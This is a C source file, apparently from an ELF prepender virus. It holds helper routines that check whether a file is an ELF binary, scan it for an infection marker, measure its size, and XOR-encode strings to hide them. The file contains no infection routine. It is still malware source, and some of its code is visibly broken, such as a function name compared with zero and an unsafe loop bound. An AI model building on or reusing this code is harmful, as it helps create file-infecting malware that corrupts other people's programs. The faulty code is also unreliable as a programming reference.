#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <assert.h>
#include <stdio.h>

#include "prepender.h"


int main() {
    printf("%s", bota(is_infected("test")));
    return 0;
}

bool is_elf(char* file_path) {
    FILE *fp = fopen(file_path, "rb");
    assert(fp != NULL);

    bool flag = false;
    char buf[4] = "";

    fread(buf, 1, 4, fp);
    flag = memcmp(buf, __MAGIC, 4) == 0;
    fclose(fp);

    return flag;
}

bool is_infected(char* file_path) {
    FILE *fp = fopen(file_path, "rb");
    assert(fp != NULL);

    bool flag = false;
    unsigned int size = file_size(file_path);
    byte* buf = (byte*)calloc(size+1, sizeof(byte));
    int mark_len = len(__INFECTION_MARK);
    
    if (!(file_size >= 0)) {
        return false;
    }

    fread(buf, 1, size, fp);
    for (size_t i = 0; i < size - mark_len; i++) {
        if (memcmp(buf+i, __INFECTION_MARK, mark_len) == 0) {
            flag = true;
        }
    }
    
    free(buf);
    fclose(fp);

    return flag;
}

unsigned int file_size(char* file_path) {
    FILE *fp = fopen(file_path, "rb");
    assert(fp != NULL);

    fseek(fp, 0, SEEK_END); 
    unsigned int size = ftell(fp); 
    fseek(fp, 0, SEEK_SET); 
    
    fclose(fp);
    return size;
}


char* xor_enc_dec(const char* str) {
    size_t length = strlen((const char*)str);
    char* result = (char*)calloc(length + 1, sizeof(byte));

    for (size_t i = 0; i < length; i++) {
        result[i] = str[i] ^ __XOR_KEY[i % len(__XOR_KEY)];
    }

    return result;
}

